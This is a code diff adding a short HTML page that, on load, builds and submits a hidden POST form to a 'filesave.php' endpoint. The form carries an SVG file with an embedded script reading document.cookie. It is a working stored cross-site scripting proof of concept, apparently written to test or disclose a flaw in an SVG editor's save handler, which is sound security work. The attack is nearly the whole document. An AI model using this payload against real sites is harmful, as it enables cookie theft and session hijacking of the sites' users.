@@ -1,0 +1,27 @@
+<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <meta charset="utf-8" />
+    <title></title>
+		<script src="http://code.jquery.com/jquery-1.10.2.min.js"></script>
+</head>
+<body>
+<form action="filesave.php">
+<input type="hidden" value="" name="output_svg" />
+</form>
+<script>
+/*globals $*/
+function xhtmlEscape(str) {'use strict';
+		return str.replace(/&(?!amp;)/g, '&amp;').replace(/"/g, '&quot;').replace(/</g, '&lt;'); // < is actually disallowed above anyways
+	}
+$('<form>').attr({
+					method: 'post',
+					action: 'filesave.php',
+					target: 'output_frame'
+				}).append('<input type="hidden" name="output_svg" value="' + xhtmlEscape('<svg width="640" height="480" xmlns="http://www.w3.org/2000/svg" xmlns:svg="http://www.w3.org/2000/svg"><script>alert(document.cookie);<\/script><\/svg>') + '">')
+					.appendTo('body')
+					.submit().remove();
+</script>
+
+</body>
+</html>
